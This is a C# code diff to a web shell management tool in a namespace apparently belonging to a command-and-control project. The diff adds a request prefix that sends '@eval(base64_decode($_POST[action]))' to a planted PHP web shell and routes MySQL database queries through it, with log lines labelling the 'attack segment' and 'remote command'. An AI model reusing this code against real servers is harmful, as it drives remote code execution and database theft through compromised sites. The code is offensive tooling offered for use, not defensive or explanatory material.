@@ -15,13 +15,14 @@ namespace C2.Business.CastleBravo.WebShellTool
         protected string prefix;
         protected StringBuilder sb;
         protected ClientSetting clientSetting;
-
+        protected string dbPrefix;
 
         public CommonClient(string password, string clientSetting)
         {
             this.clientSetting = ClientSetting.LoadSetting(clientSetting);
             this.passwd = password;
             this.prefix = password + "=" + this.clientSetting.PHP_MAKE + "&" + this.clientSetting.ACTION;
+            this.dbPrefix = password + "=@eval(base64_decode($_POST[action])); &action"; //数据库连接用统一报文，先实现，后面再改
             this.sb = new StringBuilder();
             ShellSplitS = "[S]";
             ShellSplitE = "[E]";
@@ -119,7 +120,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         public virtual string GetDatabaseInfo(string loginInfo ,string database ,string command) 
         {
             string payload = String.Format("{0}={1}&z1={2}&z2={3}&z3={4}",
-                   prefix,
+                   dbPrefix,
                    ST.EncodeUrlBase64(clientSetting.PHP_DB_MYSQL),
                    loginInfo,
                    database,
@@ -127,7 +128,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload)
-             .AppendLine(string.Format("引导段:{0}", prefix))
+             .AppendLine(string.Format("引导段:{0}", dbPrefix))
              .AppendLine(string.Format("攻击段:{0}", clientSetting.PHP_DB_MYSQL))
              .AppendLine(string.Format("参数一:{0}", loginInfo))
              .AppendLine(string.Format("参数二:{0}", database))
